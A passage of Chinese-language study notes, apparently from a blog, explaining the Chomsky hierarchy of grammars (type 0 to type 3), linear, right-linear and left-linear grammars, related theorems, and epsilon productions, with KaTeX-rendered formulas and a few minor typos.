，也叫做短语结构文法 phrase structure grammar PSG</p><p>0型文法产生的语言叫做0型语言 phrase structure language，也可以叫做短语结构语言</p><p>0型文法是最最基础的文法。它没有任何限制条件，所以可以这样说，所有的文法都属于0型文法。</p><h3 id="1型文法"><a class="markdownIt-Anchor" href="#1型文法"></a> 1型文法</h3><p>如果G是0型文法。然后对于 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>→</mo><mi>β</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\forall\alpha\rightarrow\beta\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>，均有\abs{\beta}\geq\abs{\alpha}成立。则G为1型文法或者上下文有关文法。 context sensitive grammar CSG</p><p>有G产生出的语言叫做1型语言或者上下文有关语言 CSL</p><p>1型文法实际上就是规定了产生式的右侧长度必须大于左侧长度。</p><h3 id="2型文法"><a class="markdownIt-Anchor" href="#2型文法"></a> 2型文法</h3><p>若G是1型文法。若对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>→</mo><mi>β</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\forall\alpha\rightarrow\beta\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>，均有\abs{\beta}\geq\abs{\alpha}成立，并且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>∈</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">\alpha \in V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span></span></span></span>成立（V是语法变量的集合），则称G为2型文法 或者上下文无关文法 context free grammar CFG</p><p>由G产生的语言叫做2型语言 或者上下文无关语言 context free language CFL。</p><p>实际上2型文法就是1型文法的基础上加上了产生式左侧的必须是一个语法变量，注意是<code>一个</code>，不能多，只有单个语法变量。</p><h3 id="3型文法"><a class="markdownIt-Anchor" href="#3型文法"></a> 3型文法</h3><p>G是2型文法。如果对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>→</mo><mi>β</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\forall\alpha\rightarrow\beta\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha\rightarrow\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>均具有形式 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">A\rightarrow w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A\rightarrow wB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>。其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo>∈</mo><mi>V</mi><mtext>  </mtext><mi>w</mi><mo>∈</mo><msup><mi>T</mi><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">A,B\in V\ \ w\in T^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span></span></span></span>。则称G为3型文法，也可称为正则文法 regular grammar RG 或者正规文法。 由G产生的语言叫做3型语言，可以称为正则语言或者正规语言 regular language RL。</p><p>之前2型文法规定了产生式左侧必须是单个语法变量，而没有规定产生式右侧到底是什么。</p><p>而3型文法就去规定了产生式右侧。3型文法规定产生式右侧可以有语法变量（最好的情况就是没有了，只有终结符号），如果有语法变量，那么这个语法变量只能有一个，并且放在最右侧。它前面都是终结符号。</p><p><img src="https://upyun.wuuconix.link/image-20211107121530588.png" alt="乔姆斯基体系" /></p><h3 id="定理2-1"><a class="markdownIt-Anchor" href="#定理2-1"></a> 定理2-1</h3><p>L是RL的充要条件是存在一个文法，该文法产生语言L，并且它的产生式要么是形如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">A\rightarrow a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>的产生式，要么是形如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A\rightarrow aB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>的产生式。其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A,B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>为语法变量，a为终极符号。</p><p>不证自明。这里的产生式就是正则文法。一个正则文法产生的语言一定是正则语言。 而一个正则语言也一定是一个正则文法产生的。</p><h3 id="线性文法"><a class="markdownIt-Anchor" href="#线性文法"></a> 线性文法</h3><p>设G=(V, T, P, S)，如果对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>→</mo><mi>β</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\forall\alpha\rightarrow\beta\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha\rightarrow\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 均具有如下形式：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">A\rightarrow w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi><mi>B</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">A\rightarrow wBx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">x</span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><mi>w</mi><mo separator="true">,</mo><mi>x</mi><mo>∈</mo><msup><mi>T</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">A, B\in V, w,x \in T^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，则称G为线性文法。 liner grammar</p><p>线性文法产生的语言叫做线性语言。</p><h3 id="右线性文法"><a class="markdownIt-Anchor" href="#右线性文法"></a> 右线性文法</h3><p>设G=(V, T, P, S)，如果对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>→</mo><mi>β</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\forall\alpha\rightarrow\beta\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha\rightarrow\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 均具有如下形式：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">A\rightarrow w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi><mi>B</mi></mrow><annotation encoding="application/x-tex">A\rightarrow wB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><mi>w</mi><mo>∈</mo><msup><mi>T</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">A, B \in V, w\in T^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，则称G为右线性文法 right liner grammar</p><p>右线性文法长生的语言叫做右线性语言。</p><h3 id="左线性文法"><a class="markdownIt-Anchor" href="#左线性文法"></a> 左线性文法</h3><p>设G=(V, T, P, S)，如果对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>→</mo><mi>β</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">\forall\alpha\rightarrow\beta\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha\rightarrow\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 均具有如下形式：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>w</mi></mrow><annotation encoding="application/x-tex">A\rightarrow w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi><mi>w</mi></mrow><annotation encoding="application/x-tex">A\rightarrow Bw</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><mi>w</mi><mo>∈</mo><msup><mi>T</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">A, B \in V, w\in T^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，则称G为左线性文法 left liner grammar</p><p>左线性文法长生的语言叫做左线性语言。</p><h3 id="定理2-2"><a class="markdownIt-Anchor" href="#定理2-2"></a> 定理2-2</h3><p>和定理2-1类似。L是一个左线性语言的充要条件是 存在文法G，G中的产生式是形如 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">A\rightarrow a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 或者<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>B</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">A\rightarrow Ba</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">a</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">L(G)=L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">G</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>。</p><h3 id="定理2-3"><a class="markdownIt-Anchor" href="#定理2-3"></a> 定理2-3</h3><p>左线性文法和右线性文法等价。</p><h3 id="定理2-4"><a class="markdownIt-Anchor" href="#定理2-4"></a> 定理2-4</h3><p>左线性文法的产生式和右线性文法的产生式混用所得到的文法不是RG。</p><h3 id="空语句"><a class="markdownIt-Anchor" href="#空语句"></a> 空语句</h3><p>形如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">A\rightarrow\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>的产生式叫做空产生式，也可叫做<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>产生式。</p><p>我们可以回想一下1型文法的概念，它产生式右侧的长度需要大于等于右侧的长度。所以空语句是不符合1型文法的，因为空语句的右侧是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>，它的长度是0。</p><p>所以空语句不能出现在1型文法，2型文法，正则文法中，也就不能出现在1型语言、2型语言、正则语言中。</p><p>但是为了方便研究某些问题。我们将手动将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">S\rightarrow 